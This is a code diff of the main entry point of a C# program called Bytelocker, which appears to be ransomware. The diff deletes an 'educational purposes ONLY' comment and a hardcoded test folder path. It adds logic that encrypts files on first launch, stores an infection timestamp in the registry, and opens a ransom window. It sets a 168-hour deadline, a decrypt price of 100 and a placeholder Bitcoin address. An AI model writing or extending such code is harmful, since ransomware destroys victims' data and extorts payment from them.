@@ -1,30 +1,52 @@
 ﻿using Bytelocker.CryptoManager;
+using Bytelocker.UI;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
-/*
- * Created for educational purposes ONLY
- * 
- */
 namespace Bytelocker
 {
     class Bytelocker
     {
-
-        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        private static String PATH_TO_ENCRYPT = @"C:\Users\nic\Desktop\New folder";
+        private static RegistryManager rm = new RegistryManager();
+        public static int TIME_TILL_REMOVAL_HOURS = 168;
+        public static int COST_TO_DECRYPT = 100;
+        public static String BITCOIN_ADDRESS = "sdfsfsdfsdfsd";
 
         public static void Main(String[] args)
         {
-            CryptoManagerMainHandler cs = new CryptoManagerMainHandler();
-            cs.EncryptAll(PATH_TO_ENCRYPT);
-
-            // if ui has not been opened, run encrypt all
-                
+            Encrypt();
+            LaunchWindow();
         }
+
+        private static void Encrypt()
+        {
+            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown")))
+            {
+                CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
+                cmh.EncryptAll();
+            }
+        }
+
+        [STAThread]
+        private static void LaunchWindow()
+        {
+            rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", true);
+            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "time_bool")))
+            {
+                rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "time_bool", true);
+                rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "time", DateTime.Now.ToString());
+            }
+            
+
+            MainWindow mw = new MainWindow();
+            Application.EnableVisualStyles();
+            Application.Run(mw);
+        }
+
     }
 }
